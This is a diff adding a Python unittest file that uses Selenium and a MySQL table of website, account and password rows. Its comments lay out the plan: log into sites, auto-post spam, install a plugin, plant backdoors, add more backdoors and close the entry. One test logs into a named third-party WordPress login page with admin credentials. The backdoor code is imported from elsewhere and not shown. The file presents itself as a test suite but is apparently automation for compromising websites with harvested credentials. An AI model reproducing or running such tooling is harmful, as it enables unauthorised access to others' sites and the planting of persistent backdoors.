@@ -1,0 +1,44 @@
+import unittest
+from first import *
+from selenium.common.exceptions import TimeoutException
+from selenium import webdriver
+import pymysql
+import time
+
+# 通过在数据库取20个记录 1.登录网站 2.自动发帖
+# 1.登录 2.安装插件 3.放入后门  4.进入后门 5.放更多的后门  6.关闭入口
+
+
+class NewTest(unittest.TestCase):
+    def setUp(self):
+        print('测试开始')
+        db = pymysql.connect("localhost", "root", "root", "ffy")
+        cursor = db.cursor()
+        cursor.execute("SELECT website,account,password from sheet1")
+        cursor.scroll(2722, mode='absolute')
+        cursor.scroll(1, mode='relative')
+        row = cursor.fetchmany(20)
+
+        self.browser = webdriver.Chrome()
+        self.browser.set_page_load_timeout(10)
+
+    def test_input_str(self):
+        self.assertEqual(0, input_str(self, 'https://www.computervn.com/wp-login.php', 'admin', 'admin123'))
+
+    def tearDown(self):
+        print('结束测试 开始清理环境')
+        self.browser.quit()
+        # 关闭连接
+
+    def test_check_url(self):
+        self.assertEqual(0, check_url(self, 'https://www.computervn.com/wp-login.php'))
+
+    def test_check_main_menu(self):
+        self.assertEqual(0, check_main_menu(self))
+
+
+if __name__ == '_main_':
+    suite = unittest.TestSuite()
+    suite.addTest(NewTest("test_check_main_menu"))
+    runner = unittest.TextTestRunner()
+    runner.run(suite)
